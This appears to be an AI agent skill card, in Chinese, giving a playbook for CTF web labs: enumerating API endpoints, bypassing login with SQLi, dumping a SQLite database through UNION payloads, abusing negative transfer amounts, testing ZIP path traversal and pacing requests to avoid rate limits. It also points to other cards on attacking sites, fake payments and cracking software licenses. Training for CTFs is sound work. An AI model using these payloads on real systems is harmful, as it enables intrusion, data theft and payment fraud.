---
name: ctf-web-lab
description: >-
  测绘引擎·Use when attacking CTF web labs. SQLi→UNION→SQLite→flag.
owned: true
tier: ops
pack: survey-skill
---

# ctf-web-lab（测绘引擎）

本卡已收编为测绘引擎作业卡。打站 / 假支付 / Actuator / 芋道代付仍走专卡。

全文与脚本目录：`docs/learning/skill-store/skills/ctf-web-lab/`

溯源（仅标记）：`hermes/security-research`

---

# CTF Web 靶场（Vue SPA + API 后端）

多轮 CTF 考核中反复出现的题型：Vue3 SPA 前端 + Express/Node 后端，60 分钟时限，目标拿 `CTF{...}` flag。典型实例：Digital Wallet Lab（钱包转账）、Vue 0Pages Lab（静态托管）。**套路高度一致：SQLi 登录绕过 → UNION 注入 → SQLite 拖库 → flags 表提取。**

## 1. 前端 JS 逆向 → API 枚举

SPA 页面源码看不到 API，必须抓 JS chunk：

```bash
curl -s http://target/ | grep -oE '/assets/[^"]*\.js'
# 下载全部 chunk: main.js + 懒加载页面组件 (Login-xxx.js, Dashboard-xxx.js, Transfer-xxx.js...)
grep -oE '"/api/[^"]*"' main.js | sort -u        # 明文路径
# 混淆时: 找所有字符串字面量 + 页面组件 chunk 里的 axios 调用
```

还原出的典型 API 面：`/api/login`、`/api/me`、`/api/balance`、`/api/transfer`、`/api/transactions`、`/api/users`（钱包）/ `/api/auth/register`、`/api/sites`（静态托管）。**功能型 API 必测**：转账（负数/类型混淆/IDOR）、站点（ZIP 上传）、用户（IDOR 拖他人数据）。

## 2. SPA fallback 与真实 API 的区分（关键技巧）

SPA 后端对**任意未匹配路径返回 200 + index.html**（Vue router 接管），全路径探测会假阳性一片 200。区分方法：
- 看响应头：真实静态文件有 `Last-Modified`/`ETag`；真实 API 返回 `Content-Type: application/json`
- 看响应体开头：`<!DOCTYPE html>`/`<div id="app">` = fallback
- 特殊路径返回不同内容 = 真实端点（如 `/preview/{site_id}/` 返回 "Site not found." 而 fallback 返回 HTML）

## 3. SQLi 登录绕过（第一突破口）

```bash
curl -X POST /api/login -d '{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1","password":"x"}'
# 成功 => 拿到 admin token (SQLi 直通, 无需密码)
```
- 弱口令表全灭后**必测 SQLi**：`admin' OR '1'='1` 及变体
- 登录成功响应含 `{token, user}`，token 存 localStorage，后续 API 用 `Authorization: Bearer`
- 用户名注册冲突可验证账号存在（`admin` 已存在 = 有价值目标）

## 4. UNION 注入 → 列数 → SQLite 指纹 → 拖库

```bash
# ORDER BY 数列数, 或直接 UNION SELECT 1,2,3...
# 报错"服务器内部错误"但 FROM users 可用 => SQLite!
```
**SQLite 指纹**：`sqlite_version()` 报错 + `FROM users` 可注入 + `information_schema` 报错 = SQLite（无 information_schema）。换 `sqlite_master`：

```sql
-- 列数确定后, 第N列回显到 username/email 字段
' UNION SELECT 1,2,3,4,5,6 FROM sqlite_master--
-- 枚举表: type,name,tbl_name,sql
' UNION SELECT 1,name,3,4,5,6 FROM sqlite_master--
-- 查表结构: sql 列里有 CREATE TABLE 语句(含列名)
' UNION SELECT 1,sql,3,4,5,6 FROM sqlite_master WHERE tbl_name='flags'--
-- 直接拖数据
' UNION SELECT 1,flag_value,3,4,5,6 FROM flags--
```

**写个 sqli.py 小工具**（requests + UNION payload 参数化），复用比手敲 curl 快。users 表通常含明文密码 + admin 密码——即使 SQLi 被修也是提权素材。

## 5. 业务逻辑漏洞（钱包/托管类附加分）

- **负数金额**：`amount=-100` 转账 → 余额反增（无限刷钱）
- **类型混淆**：`amount="1e2"`（字符串）绕过数值校验，记账 100 只扣 1
- **JWT HS256**：token 解码看算法，弱密钥表爆破（常见密钥未中就先放着，SQLi 通常更快）

## 6. ZIP 上传类（静态托管平台）

ZIP 部署到 `/preview/{site_id}/`：
- 平台约定 **webroot 必须是 ZIP 内的 `webroot/` 目录**（无该前缀则部署后无内容可服务）
- **路径穿越**：条目名带 `../` 时返回 "Site not found."（保留 `..` 语义但文件落在 webroot 外，预览服务隔离）——先做受控实验确认解压基目录
- **符号链接**：symlink 条目被保留但**预览服务不跟随解析**（返回链接字符串本身）——别在这上面耗
- 核心攻击面是解压目录是否逃逸沙箱（可写应用目录 → 覆盖配置/RCE），用 `webroot/../../..` 深穿越 + 预览/下载接口验证

## 7. 速率限制（必踩坑）

批量 curl 探测后服务器开始 `Empty reply`（curl exit 52，连接被重置）= **IP 被限流/封禁**。对策：
- 每请求间隔 ≥2-3s，批量枚举前先小样本探测
- 被封后等 2-5 分钟自动解封（不是永久 ban）
- 关键验证（登录/注入）优先级高于目录枚举，先打核心再补外围

## Pitfalls
- SPA fallback 全 200 → 必须看响应头/体区分真实端点，否则枚举结果全假
- `database()`/`sqlite_version()` 报错 ≠ WAF 拦截，可能是 SQLite（换 sqlite_master）
- UNION 里带子查询（information_schema 等）会报"服务器内部错误"——这是 SQLite 指纹信号不是失败
- 多端口多靶场（30017/30018）各自独立，别混 cookie/token
- flag 提取后立即提交，计时制靶场时间宝贵

## 相关
- 钱包靶场（SQLi→flags 表）与 0Pages 靶场（ZIP 攻击面 + 限流）实战见 `references/wallet-0pages-labs.md`
- 桌面软件破解（PyInstaller/Electron 卡密绕过）见 `pyinstaller-exe-re`、`desktop-software-reversing`
